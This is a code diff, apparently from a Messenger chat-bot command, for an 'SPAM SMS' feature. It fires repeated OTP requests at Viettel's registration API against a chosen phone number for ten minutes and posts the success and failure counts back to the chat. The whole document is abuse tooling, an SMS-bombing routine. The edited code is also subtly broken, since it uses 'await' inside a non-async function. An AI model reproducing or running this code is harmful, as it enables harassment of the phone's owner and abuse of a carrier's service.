@@ -394,7 +394,24 @@ const payload = {
       'fromSys': 'WEBKHLC',
     };
 
-            const csrfResponse = await axios.get('https://viettel.vn/dang-ky', {
+            
+
+    // Initial message to be edited later
+    let messageID = null;
+    let successCount = 0;
+    let failureCount = 0;
+
+    // Send initial message showing spam details
+    const initialMessage = `SPAM SMS\nSố: ${phone}\nThời gian spam: 10 phút\nSố lần gửi thành công: ${successCount}\nSố lần gửi thất bại: ${failureCount}`;
+    api.sendMessage(initialMessage, event.threadID, (error, messageInfo) => {
+      if (!error) {
+        messageID = messageInfo.messageID;
+      }
+    });
+
+    // Function to send spam requests
+    const sendSpamRequests = () => {
+      const csrfResponse = await axios.get('https://viettel.vn/dang-ky', {
           headers: {
             'Host': 'viettel.vn',
             'Connection': 'keep-alive',
@@ -429,22 +446,6 @@ const payload = {
         const viettelData = {
           'msisdn': phone
         };
-
-    // Initial message to be edited later
-    let messageID = null;
-    let successCount = 0;
-    let failureCount = 0;
-
-    // Send initial message showing spam details
-    const initialMessage = `SPAM SMS\nSố: ${phone}\nThời gian spam: 10 phút\nSố lần gửi thành công: ${successCount}\nSố lần gửi thất bại: ${failureCount}`;
-    api.sendMessage(initialMessage, event.threadID, (error, messageInfo) => {
-      if (!error) {
-        messageID = messageInfo.messageID;
-      }
-    });
-
-    // Function to send spam requests
-    const sendSpamRequests = () => {
       // Send both requests in parallel
       Promise.all([
         axios.post('https://viettel.vn/api/get-otp', viettelData, {
